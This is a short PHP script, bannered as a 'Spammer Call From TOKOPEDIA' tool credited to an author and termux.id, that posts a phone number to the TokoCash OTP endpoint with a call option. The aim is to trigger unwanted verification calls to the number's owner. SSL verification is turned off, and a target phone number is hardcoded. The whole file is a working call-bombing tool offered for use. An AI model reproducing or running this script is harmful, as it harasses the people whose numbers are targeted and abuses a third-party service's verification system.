<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
    Spammer Call From TOKOPEDIA
        Author By   : AyipBontos
        Support     : Kunjungi Website Kami
        Website     : https://termux.id
        Youtube     : Omalip TV
     Penggunaannya  : Bisa Menggunakan [08/62]
###########################################################\n";
echo "Nomor\nInput : ";
$nomor = "03452154700";
$execute = send($nomor);
print $execute;
?>
